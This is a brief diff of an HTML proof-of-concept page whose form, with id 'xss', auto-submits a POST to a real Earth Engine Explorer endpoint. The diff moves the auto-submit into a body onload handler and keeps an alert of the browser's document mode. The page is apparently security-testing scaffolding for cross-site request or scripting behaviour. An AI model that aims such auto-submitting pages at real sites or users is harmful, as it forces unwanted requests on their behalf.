@@ -1,8 +1,8 @@
 <html>
 <head>
-<script>function subm(){document.getElementById('xss').submit()};subm();alert(document.documentMode)</script> 
+<script>alert(document.documentMode)</script> 
 </head>
-<body>
+<body onload="document.getElementById('xss').submit()">
 
 <form  id="xss" action="https://explorer.earthengine.google.com/getProject" method="POST"></form>
 
